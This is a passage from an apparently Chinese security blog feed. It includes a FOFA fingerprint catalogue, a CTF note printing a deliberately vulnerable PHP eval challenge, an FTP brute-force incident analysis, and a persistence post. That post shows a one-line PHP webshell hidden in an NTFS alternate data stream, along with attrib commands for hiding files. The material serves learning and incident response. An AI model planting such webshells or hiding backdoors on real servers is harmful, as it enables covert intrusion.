jsp， perl， nodejs， ASP，</p><h3 id="前端库"><a href="#前端库" class="headerlink" title="前端库"></a>前端库</h3><p>jquery， bootstrap， d3， jquery-ui， yui， AlloyUI，</p><h3 id="分享模块"><a href="#分享模块" class="headerlink" title="分享模块"></a>分享模块</h3><p>jiathis， ujian， 百度分享， joomla-facebook， addthis， hellobar，</p><h3 id="路由器"><a href="#路由器" class="headerlink" title="路由器"></a>路由器</h3><p>百为路由， 锐捷NBR路由器， mikrotik， 中兴路由器， h3c路由器， jcg无线路由器， D-Link_VoIP_Wireless_Router， arrisi_Touchstone， ZyXEL， Ruckus， Motorola_SBG900， Wimax_CPE， Cisco_Cable_Modem， Scientific-Atlanta_Cable_Modem， rap， ZTE_MiFi_UNE， DI-804HV， HuaweiHomeGateway， TP-LINK无线路由器，</p><h3 id="云评论"><a href="#云评论" class="headerlink" title="云评论"></a>云评论</h3><p>uyan， disqus，</p><h3 id="统计模块"><a href="#统计模块" class="headerlink" title="统计模块"></a>统计模块</h3><p>google-analytics， cnzz， baidu统计， 51la， CNZZ统计， awstats_misc_tracker， advancedwebstats， hubspot， 51yes， Piwik，</p><h3 id="开发框架"><a href="#开发框架" class="headerlink" title="开发框架"></a>开发框架</h3><p>ThinkPHP， Swiftlet， Aspnetmvc， CodeIgniter， ColdFusion， WebObjects， cakephp， Django， zikula_framework， NetteFramework， Fat-FreeFramework， Play-Framework， Restlet-Framework， Kohana-Framework， flow_framework， SIMIT_framework， axis2-web，</p><h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><p>mongodb， elasticsearch， phpMyadmin， MVB2000， GPSweb， Tumblr， phpinfo， AD<em>RS设备， FrontPageServerExtension， 认证页面， TCN协议， sharepoint， MS-Author-Via， 3COM_NBX， wspx， rack-cache， Dnnoutputcache， Iisexport， Oraclea-DMS， P3p_enabled， X-72e-Nobeian-Transfer， ManagedFusion， Adblock， Blackboard， LiquidGIS， Cocoon， Wp-Super-Cache， pagespeed， Alternate-Protocol， unbouncepages， lemis管理系统， OpenSSL， mod_bwlimited， mod_auth_passthrough， FreeboxOS， SMA_Sunny_Webbox， Wimax_CPE， Aethra_Telecommunications_Operating_System， Scientific-Atlanta_Cable_Modem， rap， ZTE_MiFi_UNE， 用友商战实践平台， moosefs， AirLink_modem， CCProxy， APC_Management， HuaweiHomeGateway， TP-LINK无线路由器， 蓝盾BDWebGuard， 护卫神网站安全系统， phpDocumentor， ColdFusion， Adobe</em> CQ5， Adobe_GoLive， Adobe_RoboHelp， Amaya， PHP-CGI， Synology_NAS， OpenMas， __VIEWSTATE， Chromelogger， Communique， recaptcha， IPFire， TerraMaster， 创星伟业校园网群， 正方教务管理系统， UFIDA_NC， 北创图书检索系统， Facebook_insights， squarespace建站， Bad_Behavior， Azure_ARR， Tncms， 北京清科锐华CEMIS， RG-PowerCache内容加速系统， dayrui系列产品， Privoxy代理， wordpress_qTranslate， DVWA， sugon_gridview， blog_fc2， LiteSpeed_Web_Admin_Console， SLTM32_Configuration， SHOUTcast， Piwigo， seeyoo广告机， milu_seotool， Moxa Nport串口服务器， CISCO_EPC3925， CASino， metasploit，</p><h3 id="SSL证书"><a href="#SSL证书" class="headerlink" title="SSL证书"></a>SSL证书</h3><p>thawte_ssl_cert， wosign_ssl_cert， webtrust_cert， globalsign_cert， GeoTrust_cert，</p><h3 id="安全检测平台"><a href="#安全检测平台" class="headerlink" title="安全检测平台"></a>安全检测平台</h3><p>360网站安全检测， teamportal，</p><h3 id="项目管理"><a href="#项目管理" class="headerlink" title="项目管理"></a>项目管理</h3><p>jira， fisheye， VisualSVN， Redmine， zentao， Bugzilla， Phabricator， reviewboard， Hudson， Jenkins， testlink， trac， gitlab， mantis， Mercurial，</p><h3 id="服务器管理"><a href="#服务器管理" class="headerlink" title="服务器管理"></a>服务器管理</h3><p>LuManager， 主机宝， wdcp管理系统， LANMP一键安装包， UPUPW， wamp， easypanel， awstats_admin， awstats， uPlusFtp， Cactiez， Cacti， CrushFTP， HFS， WHM， moosefs， LUM服务器管理， 护卫神主机管理， cpanel， bacula-web， Webmin， Directadmin， Synology_DiskStation， Puppet_Node_Manager，</p><h3 id="企业管理"><a href="#企业管理" class="headerlink" title="企业管理"></a>企业管理</h3><p>易瑞授权访问系统， MVB2000， SonicWALL， NetShare<em>VPN， pmway_E4_crm， srun3000计费认证系统， Dolibarr， Parallels Plesk Panel， EasyTrace(botwave)， 管理易， 亿赛通DLP， huawei_auth_server， 瑞友天翼</em>应用虚拟化系统 ， Vmware_vFabric， ICEFLOW_VPN， 360企业版， 用友erp-nc， 深信服ssl-vpn， 天融信VPN， Array_Networks_VPN， 天融信防火墙， o2security_vpn， zabbix， juniper_vpn， F5_BIGIP， CEMIS， DI-804HV， CCProxy， 梭子鱼设备， Synology_NAS， zenoss， Splunk， OpenMas， Ultra_Electronics， NOALYSS， Nagios， ALCASAR， orocrm， Adiscon_LogAnalyzer， Munin， opennms， MRTG， ganglia， 元年财务软件， UFIDA_NC， Webmin， 锐捷应用控制引擎， Storm， 网神VPN， FortiWeb， Centreon， FortiGuard， PineApp， ntop， CDR-Stats， GenieATM， Spark_Worker， Spark_Master， Kibana， CISCO_VPN， UcSTAR， i@Report， 帕拉迪统一安全管理和综合审计系统， openEAP， Dorado， 金龙卡金融化一卡通网站查询子系统， 一采通， 埃森诺网络服务质量检测系统， 惠尔顿上网行为管理系统， ACSNO网络探针， 绿盟下一代防火墙， 用友U8， 华为_HUAWEI_SRG1220， 华为_HUAWEI_SRG2220， 华为_HUAWEI_ASG2100， 华为_HUAWEI_SRG3250， 华为_HUAWEI_ASG2050， 华为（HUAWEI）安全设备， 华为（HUAWEI）Secoway设备， Fireeye，</p><h3 id="CDN"><a href="#CDN" class="headerlink" title="CDN"></a>CDN</h3><p>蓝讯， 网宿， 帝联， 快网， Webluker， 西部数码， gocdn， Powercdn， Akamai， QingCloud， amazon-cloudfront，</p><h3 id="Web服务器"><a href="#Web服务器" class="headerlink" title="Web服务器"></a>Web服务器</h3><p>Sun[tm]， ZendServer， squid， JBoss<em>AS， oracle_applicaton_server， IIS， nginx， tomcat， Apache， Tengine， IBM_HTTP_Server， GSE， LiteSpeed， Microsoft-HTTPAPI， ngx_openresty， Zeus， Resin， Netscape-Enterprise， Phusion， webrick， Jetty， Sun-ONE-Web-Server， Oracle-Application-Server， JBoss， kangle反向代理， Varnish， Aicache， SJSWS</em> OiWS， AOLserver， Lotus-Domino， gunicorn， Allegro-Software-RomPager， Starlet， nginx_admin， FortiWeb， GlassFish， Privoxy， 东方通应用服务器TongWeb， Mbedthis-Appweb，</p><h3 id="网站防火墙WAF"><a href="#网站防火墙WAF" class="headerlink" title="网站防火墙WAF"></a>网站防火墙WAF</h3><p>一启快， 360主机卫士， 安全狗， Websecurity_WAF， webray， weidun， 安慧网盾， Safe3WAF， AnZuWAF， DnP Firewall， Kerio_WinRoute_Firewall， Dotdefender， Citrix_Netscaler， Mod_Security， PaloAlto_Firewall， WebKnight， Sucuri， 梭子鱼防火墙， 云锁，</p><h3 id="路由器-1"><a href="#路由器-1" class="headerlink" title="路由器"></a>路由器</h3><p>dd-wrt， 锐捷NBR路由器， mikrotik， 中兴路由器， h3c路由器， jcg无线路由器， Comcast_Business_Gateway， AirLink_modem，</p><h3 id="CMS"><a href="#CMS" class="headerlink" title="CMS"></a>CMS</h3><p>phpshe， ThinkSAAS， e-tiller， DouPHP， twcms， SiteServer， Joomla， HDWiki， kesionCMS， CMSTop， ESPCMS， 74cms， Foosun， PhpCMS， Hanweb， Drupal， cmseasy， wordpress， DedeCMS， ASPCMS， MetInfo， Npoint， 小蚂蚁， 捷点JCMS， 帝国EmpireCMS， JEECMS， emlog， IdeaCMS， TCCMS， DIYWAP， supesite， webplus， Dolibarr， ExpressionEngine， iAPPS， Liferay， Telerik Sitefinity， PageAdmin， sdcms， EnterCRM， 易普拉格科研管理系统， 苏亚星校园管理系统， 313自助建站， trs<em>wcm， we7， 1024cms， 360webfacil_360WebManager， 6kbbs， ABO_CMS， Acidcat_CMS， bit-service， 云因网上书店， DotNetNuke， plone， Kooboocms， unknown_cms， chanzhi， unknown_cms_rcms， MediaWiki， Typecho， Z-Blog， Z-BlogPHP， EleanorCMS， BitrixSiteManager， FOXI BIZzz， BPanelCMS， SubrionCMS， WMSN， TwilightCMS， TechartCMS， 2z project， phpDocumentor， 微门户， Osclass， webEdition， orocrm， 创星伟业校园网群， BoyowCMS， 正方教务管理系统， UFIDA_NC， phpweb， weebly， 地平线CMS， HIMS酒店云计算服务， Tipask， 北创图书检索系统， squarespace建站， 微普外卖点餐系统， 逐浪zoomla， Zikula_CMS， mozartframework， UMI.CMS， EasywebCMS， synkronvia， sitecore， MuraCMS， irecms， typo3， SamanPortal， 北京清科锐华CEMIS， ThinkSNS， asp168欧虎， 擎天电子政务， easysite， 北京阳光环球建站系统， MaticsoftSNS</em>动软分享社区， FineCMS， Diferior， DokuWiki， WebsiteBaker-CMS， concrete5， 国家数字化学习资源中心系统， 某通用型政府cms， PigCms， 天柏在线培训/考试系统， 万户网络， rcms， 全国烟草系统， O2OCMS， 一采通，</p><h3 id="视频监控"><a href="#视频监控" class="headerlink" title="视频监控"></a>视频监控</h3><p>EdmWebVideo， iDVR， edvr， AVCON6， Polycom， Plesk， techbridge， NETSurveillance， 海康威视（Hikvision）， nvdvr， DVR camera， TRSMAS， Macrec_DVR， Aethra_Telecommunications_Operating_System， ECOR， MOBOTIX_Camera， OnSSI_Video_Clients， Linksys_SPA_Configuration ， eagleeyescctv， dasannetworks， 海康威视iVMS， 佳能网络摄像头(Canon Network Cameras)， NetDvrV3，</p><h3 id="网站云防护"><a href="#网站云防护" class="headerlink" title="网站云防护"></a>网站云防护</h3><p>cloudflare， 加速乐， Incapsula， 百度云加速， 360网站卫士， 安全宝， BinarySec， Sucuri， NetteFramework，</p><h3 id="论坛社区"><a href="#论坛社区" class="headerlink" title="论坛社区"></a>论坛社区</h3><p>phpbb， phpwind， discuz， vBulletin， 6kbbs， IP.Board，</p><h3 id="邮件系统"><a href="#邮件系统" class="headerlink" title="邮件系统"></a>邮件系统</h3><p>fangmail， 腾讯企业邮箱， MDaemon， 亿邮， 网易企业邮箱， TurboMail， magicwinmail， 万网企业云邮箱， bxemail， Coremail， imailserver， exchange， Zimbra， Lotus， Roundcube， Horde， Atmail， iGENUS_webmail， anymacro， mirapoint， iredadmin(Roundcube?)， SquirrelMail， U-Mail， ExtMail， Spammark邮件信息安全网关，</p><h3 id="站长平台"><a href="#站长平台" class="headerlink" title="站长平台"></a>站长平台</h3><p>360站长平台， baidu站长平台， google站长平台， sogou站长平台，</p><h3 id="电商系统"><a href="#电商系统" class="headerlink" title="电商系统"></a>电商系统</h3><p>Zen Cart， ECShop， Shop7Z， 同城多用户商城， iWebShop， eaststorecreeator， buscape， 1und1， 3DCART， cart<em>engine， Magento， OpenCart， ECMall， PrestaShop， Bigcommerce， TinyShop， hishop， Maticsoft_Shop</em>动软商城， shopify， hikashop，</p><h3 id="OA系统"><a href="#OA系统" class="headerlink" title="OA系统"></a>OA系统</h3><p>华天动力OA(OA8000)， 通达OA， OA(a8/seeyon/ufida)， yongyoufe， pmway_E4_crm， Dolibarr， PHPOA， 78oa， WishOA， 金和协同管理平台， 泛微协同办公OA， 万户ezOFFICE， ranzhi， Zimbra， Lotus， OA企业智能办公自动化系统， ecwapoa， ezOFFICE，</p><h2 id="3、使用场景"><a href="#3、使用场景" class="headerlink" title="3、使用场景"></a>3、使用场景</h2><p>例如Apache出来了一个高危漏洞，受影响的版本号为2.4.23,我们需要去本公司可能受此漏洞影响的Apache服务器，那么我们可以使用高级查询语句server==”Apache/2.4.23”&amp;&amp;domain=”xxx.com”，搜索结果即为本公司域名下的所有子域名可能存在Apache2.4.23版本漏洞的URL，安全人员可以对结果进行检查，及时修复漏洞。</p><h1 id="三、FOFA的特点"><a href="#三、FOFA的特点" class="headerlink" title="三、FOFA的特点"></a>三、FOFA的特点</h1><h2 id="1-支持API查询接口，便于进行程序间的自动化查询、处理功能，进行进一步的业务分析"><a href="#1-支持API查询接口，便于进行程序间的自动化查询、处理功能，进行进一步的业务分析" class="headerlink" title="1.支持API查询接口，便于进行程序间的自动化查询、处理功能，进行进一步的业务分析"></a>1.支持API查询接口，便于进行程序间的自动化查询、处理功能，进行进一步的业务分析</h2><p>用法如下：</p><p>所有调用都需要提供身份信息，主要是email和key，email主要是注册和登陆时填写的email，key需要用户到个人中心获取32位的hash值，即为API KEY。将上面的两个信息填入api接口中，即可获取json格式的数据。</p><h2 id="2-支持下载功能"><a href="#2-支持下载功能" class="headerlink" title="2.支持下载功能"></a>2.支持下载功能</h2><p>搜索到结果之后可在右侧选择下载功能，可下载搜索到的所有数据，下载的格式支持CSV，JSON，XML格式，方便程序调用进行全网扫描。</p>]]></content>
    
    
    <summary type="html">Fofa</summary>
    
    
    
    <category term="渗透测试" scheme="https://github.com/Eviden0/new-webpage/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
  </entry>
  
  <entry>
    <title>SQL注入之Quine注入</title>
    <link href="https://github.com/Eviden0/new-webpage/posts/4361ef96.html"/>
    <id>https://github.com/Eviden0/new-webpage/posts/4361ef96.html</id>
    <published>2024-06-17T03:49:00.000Z</published>
    <updated>2024-07-08T10:01:57.796Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p><a href="https://www.anquanke.com/post/id/253570#h2-9">从三道赛题再谈Quine trick-安全客 - 安全资讯平台 (anquanke.com)</a></p><p><a href="https://blog.csdn.net/qq_35782055/article/details/130348274">sql注入 Quine注入解析_char(46)-CSDN博客</a></p></blockquote>]]></content>
    
    
    <summary type="html">HardSQL</summary>
    
    
    
    <category term="CTF" scheme="https://github.com/Eviden0/new-webpage/categories/CTF/"/>
    
    
    <category term="SQL注入" scheme="https://github.com/Eviden0/new-webpage/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>6-15记录</title>
    <link href="https://github.com/Eviden0/new-webpage/posts/10b0751c.html"/>
    <id>https://github.com/Eviden0/new-webpage/posts/10b0751c.html</id>
    <published>2024-06-15T13:49:00.000Z</published>
    <updated>2024-07-08T10:01:57.794Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p><strong>[GXYCTF 2019]禁止套娃</strong></p></blockquote><ol><li><p>扫目录发现了<code>.git</code>, 403不要紧, 试试<code>.git/HEAD</code>能不能访问</p></li><li><p>如果能访问, 用<code>git-dumper</code>等工具下载<code>git</code>目录</p></li><li><p><img src="https://gitee.com/eviden/img/raw/master/202406152205960.png" alt="image-20240615220521855"></p></li></ol><p>代码审计:<code>典型的无参数RCE</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;flag在哪里呢？&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[a-z,_]+\((?R)?\)/&#x27;</span>, <span class="literal">NULL</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/et|na|info|dec|bin|hex|oct|pi|log/i&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">                <span class="comment">// echo $_GET[&#x27;exp&#x27;];</span></span><br><span class="line">                @<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;还差一点哦！&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;再好好想想！&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;还想读flag，臭弟弟！&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// highlight_file(__FILE__);</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">6-15记录</summary>
    
    
    
    <category term="CTF" scheme="https://github.com/Eviden0/new-webpage/categories/CTF/"/>
    
    
  </entry>
  
  <entry>
    <title>Emergency-Response-Notes README</title>
    <link href="https://github.com/Eviden0/new-webpage/posts/c50485dc.html"/>
    <id>https://github.com/Eviden0/new-webpage/posts/c50485dc.html</id>
    <published>2024-06-13T05:10:00.000Z</published>
    <updated>2024-06-13T05:55:41.935Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://bypass007.github.io/Emergency-Response-Notes/Summary/image/sum-title.png" alt=""></p><p>GitHub  地址：<a href="https://github.com/Bypass007/Emergency-Response-Notes">https://github.com/Bypass007/Emergency-Response-Notes</a></p><p>GitBook 地址：<a href="https://bypass007.github.io/Emergency-Response-Notes/">https://bypass007.github.io/Emergency-Response-Notes/</a></p><h3 id="项目介绍"><a href="#项目介绍" class="headerlink" title="项目介绍"></a>项目介绍</h3><p>面对各种各样的安全事件，我们该怎么处理？</p><p>这是一个关于安全事件应急响应的项目，从系统入侵到事件处理，收集和整理了一些案例进行分析。</p><p>我将持续更新这份笔记，希望能帮到有需要的人。</p><p>如果你看到好的案例，欢迎通过issue提交。</p><h3 id="项目目录"><a href="#项目目录" class="headerlink" title="项目目录"></a>项目目录</h3><ul><li><p><strong>[第一章：入侵排查篇]</strong></p><ul><li><p>第1篇：Window入侵排查</p></li><li><p>第2篇：Linux入侵排查</p></li><li><p>第3篇：常见的Webshell查杀工具</p></li><li><p>第4篇：如何发现隐藏的Webshell后门</p></li><li><p>第5篇：勒索病毒自救指南</p></li></ul></li><li><p><strong>[第二章：日志分析篇]</strong></p><ul><li><p>第1篇:Window日志分析</p></li><li><p>第2篇:Linux日志分析 </p></li><li><p>第3篇:Web日志分析</p></li><li><p>第4篇:MSSQL日志分析 </p></li><li><p>第5篇:MySQL日志分析</p></li></ul></li><li><p><strong>[第三章：权限维持篇]</strong></p><ul><li><p>第1篇：Windows权限维持—隐藏篇</p></li><li><p>第2篇：Windows权限维持—后门篇</p></li><li><p>第3篇：Linux权限维持—隐藏篇</p></li><li><p>第4篇：Linux权限维持—后门篇</p></li><li><p>第5篇：Windows命令行文件下载方式汇总</p></li><li><p>第6篇：三大渗透测试框架权限维持技术</p></li><li><p>第7篇：常见WebShell管理工具</p></li></ul></li><li><p><strong>[第四章:Windows实战篇]</strong></p><ul><li><p>第1篇：FTP暴力破解</p></li><li><p>第2篇：蠕虫病毒</p></li><li><p>第3篇：勒索病毒</p></li><li><p>第4篇：ARP病毒</p></li><li><p>第5篇：挖矿病毒（一）</p></li><li><p>第6篇：挖矿病毒（二）</p></li></ul></li><li><p><strong>[第五章：Linux实战篇]</strong></p><ul><li><p>第1篇：SSH暴力破解</p></li><li><p>第2篇：捕捉短连接</p></li><li><p>第3篇：挖矿病毒</p></li><li><p>第4篇：盖茨木马</p></li><li><p>第5篇：DDOS病毒</p></li><li><p>第6篇：Shell病毒</p></li></ul></li><li><p><strong>[第六章：Web实战篇]</strong></p><ul><li><p>第1篇：网站被植入Webshell</p></li><li><p>第2篇：门罗币恶意挖矿</p></li><li><p>第3篇：批量挂黑页</p></li><li><p>第4篇：新闻源网站劫持</p></li><li><p>第5篇：移动端劫持</p></li><li><p>第6篇：搜索引擎劫持</p></li><li><p>第7篇：网站首页被篡改</p></li><li><p>第8篇：管理员账号被篡改</p></li><li><p>第9篇：编辑器入侵事件</p></li></ul></li></ul><hr><h3 id="学习交流"><a href="#学习交流" class="headerlink" title="学习交流"></a>学习交流</h3><p>后续持续更新内容，将发布在公众号Bypass—，同时公众号提供了该项目的PDF版本，关注后回复”应急响应” 即可下载。</p><p><img src="https://bypass007.github.io/Emergency-Response-Notes/Summary/image/sum-erweima.jpg" alt=""></p>]]></content>
    
    
    <summary type="html">学习应急响应咯!</summary>
    
    
    
    <category term="渗透测试" scheme="https://github.com/Eviden0/new-webpage/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="应急响应" scheme="https://github.com/Eviden0/new-webpage/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"/>
    
  </entry>
  
  <entry>
    <title>第04章_Windows实战篇第1篇_FTP暴力破解</title>
    <link href="https://github.com/Eviden0/new-webpage/posts/d61eb2b.html"/>
    <id>https://github.com/Eviden0/new-webpage/posts/d61eb2b.html</id>
    <published>2024-06-13T05:10:00.000Z</published>
    <updated>2024-06-13T06:28:00.706Z</updated>
    
    <content type="html"><![CDATA[<h2 id="第1篇：FTP暴力破解"><a href="#第1篇：FTP暴力破解" class="headerlink" title="第1篇：FTP暴力破解"></a>第1篇：FTP暴力破解</h2><h3 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h3><p>​    FTP是一个文件传输协议，用户通过FTP可从客户机程序向远程主机上传或下载文件，常用于网站代码维护、日常源码备份等。如果攻击者通过FTP匿名访问或者弱口令获取FTP权限，可直接上传webshell，进一步渗透提权，直至控制整个网站服务器。</p><h3 id="0x01-应急场景"><a href="#0x01-应急场景" class="headerlink" title="0x01 应急场景"></a>0x01 应急场景</h3><p>​    从昨天开始，网站响应速度变得缓慢，网站服务器登录上去非常卡，重启服务器就能保证一段时间的正常访问，网站响应状态时而飞快时而缓慢，多数时间是缓慢的。针对网站服务器异常，系统日志和网站日志，是我们排查处理的重点。查看Window安全日志，发现大量的登录失败记录：</p><p><img src="image/win-5-1.png" alt=""></p><h3 id="0x02-日志分析"><a href="#0x02-日志分析" class="headerlink" title="0x02 日志分析"></a>0x02 日志分析</h3><p><strong>安全日志分析：</strong> </p><p>安全日志记录着事件审计信息，包括用户验证（登录、远程访问等）和特定用户在认证后对系统做了什么。</p><p>打开安全日志，在右边点击筛选当前日志， 在事件ID填入4625，查询到事件ID4625，事件数177007，从这个数据可以看出，服务器正则遭受暴力破解：</p><p><img src="image/win-5-2.png" alt=""></p><p>进一步使用Log Parser对日志提取数据分析，发现攻击者使用了大量的用户名进行爆破，例如用户名：fxxx，共计进行了17826次口令尝试，攻击者基于“fxxx”这样一个域名信息，构造了一系列的用户名字典进行有针对性进行爆破，如下图：</p><p><img src="image/win-5-3.png" alt=""></p><p>这里我们留意到登录类型为8，来了解一下登录类型8是什么意思呢？</p><p><strong>登录类型8：网络明文（NetworkCleartext）</strong>   </p><p>这种登录表明这是一个像类型3一样的网络登录，但是这种登录的密码在网络上是通过明文传输的，WindowsServer服务是不允许通过明文验证连接到共享文件夹或打印机的，据我所知只有当从一个使用Advapi的ASP脚本登录或者一个用户使用基本验证方式登录IIS才会是这种登录类型。“登录过程”栏都将列出Advapi。  </p><p>我们推测可能是FTP服务，通过查看端口服务及管理员访谈，确认服务器确实对公网开放了FTP服务。</p><p><img src="image/win-5-4.png" alt=""></p><p>另外，日志并未记录暴力破解的IP地址，我们可以使用Wireshark对捕获到的流量进行分析，获取到正在进行爆破的IP：</p><p><img src="image/win-5-5.png" alt=""></p><p>通过对近段时间的管理员登录日志进行分析，如下：</p><p><img src="image/win-5-6.png" alt=""></p><p>管理员登录正常，并未发现异常登录时间和异常登录ip，这里的登录类型10，代表远程管理桌面登录。</p><p>另外，通过查看FTP站点，发现只有一个测试文件，与站点目录并不在同一个目录下面，进一步验证了FTP暴力破解并未成功。</p><p><img src="image/win-5-7.png" alt=""></p><p>应急处理措施：1、关闭外网FTP端口映射           2、删除本地服务器FTP测试</p><h3 id="0x04-处理措施"><a href="#0x04-处理措施" class="headerlink" title="0x04 处理措施"></a>0x04 处理措施</h3><p>​    FTP暴力破解依然十分普遍，如何保护服务器不受暴力破解攻击，总结了几种措施：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">1</span>、禁止使用FTP传输文件，若必须开放应限定管理IP地址并加强口令安全审计（口令长度不低于<span class="number">8</span>位，由数字、大小写字母、特殊字符等至少两种以上组合构成）。</span><br><span class="line"><span class="attribute">2</span>、更改服务器FTP默认端口。</span><br><span class="line"><span class="attribute">3</span>、部署入侵检测设备，增强安全防护。</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">学习应急响应咯!</summary>
    
    
    
    <category term="渗透测试" scheme="https://github.com/Eviden0/new-webpage/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="应急响应" scheme="https://github.com/Eviden0/new-webpage/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"/>
    
  </entry>
  
  <entry>
    <title>第03章：权限维持篇第1篇：Windows权限维持--隐藏篇</title>
    <link href="https://github.com/Eviden0/new-webpage/posts/143d02f0.html"/>
    <id>https://github.com/Eviden0/new-webpage/posts/143d02f0.html</id>
    <published>2024-06-13T05:10:00.000Z</published>
    <updated>2024-06-13T05:57:09.045Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h3><p>攻击者在获取服务器权限后，通常会用一些后门来维持权限，如果你想让你的后门保持的更久些，那么请隐藏好它，使之不易被管理员发现。</p><h3 id="0x01-隐藏文件"><a href="#0x01-隐藏文件" class="headerlink" title="0x01 隐藏文件"></a>0x01 隐藏文件</h3><p><strong>1、利用文件属性</strong></p><p>最简单的一种隐藏文件的方式，文件右键属性，勾选隐藏，点击确定后，在这个文件里看不到刚刚的文件了。</p><p><img src="https://gitee.com/eviden/img/raw/master/privilege-1-1.png" alt=""></p><p>如果要让文件显示出来，就点击查看，勾选显示隐藏的文件，文件就显示出来。</p><p><img src="https://gitee.com/eviden/img/raw/master/privilege-1-2.png" alt=""></p><p>如何真正隐藏文件？</p><p>使用Attrib +s +a +h +r命令就是把原本的文件夹增加了系统文件属性、存档文件属性、只读文件属性和隐藏文件属性。</p><p><code>attrib +s +a +h +r  D:\test\project\test</code>.txt</p><p>这样就做到了真正的隐藏，不管你是否显示隐藏文件，此文件夹都看不见。</p><p>破解隐藏文件：</p><p>打开电脑文件夹选项卡，取消”隐藏受保护的操作系统文件“勾选，把”隐藏文件和文件夹“下面的单选选择“显示隐藏的文件、文件夹和驱动器”。</p><p><img src="https://gitee.com/eviden/img/raw/master/privilege-1-3.png" alt=""></p><p><strong>2、利用ADS隐藏文件内容</strong></p><p>​    在服务器上echo一个数据流文件进去，比如index.php是网页正常文件，我们可以这样子搞： 　</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> ^<span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;chopper&#x27;</span>]);?^&gt; &gt; index.php:hidden.jpg</span><br></pre></td></tr></table></figure><p>这样子就生成了一个不可见的shell hidden.jpg，常规的文件管理器、type命令，dir命令、del命令发现都找不出那个hidden.jpg的。　</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">问题<span class="number">1</span>：如何查看index<span class="selector-class">.php</span>:hidden.jpg内容呢？</span><br><span class="line"></span><br><span class="line">　　进入文件所在目录，notepad index<span class="selector-class">.php</span>:hidden<span class="selector-class">.jpg</span>    或者 dir /<span class="attribute">r</span></span><br><span class="line">　　</span><br><span class="line">问题<span class="number">2</span>：如何删除index<span class="selector-class">.php</span>:hidden.jpg？</span><br><span class="line"></span><br><span class="line">     直接删除index.php即可</span><br></pre></td></tr></table></figure><p><strong>3、驱动级文件隐藏</strong></p><p>驱动隐藏我们可以用过一些软件来实现，软件名字叫：Easy File Locker      </p><p>下载链接： <a href="http://www.xoslab.com/efl.html">http://www.xoslab.com/efl.html</a></p><p>如果你在网站目录未查找到相关文件，且系统目录存在存在以下文件：</p><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 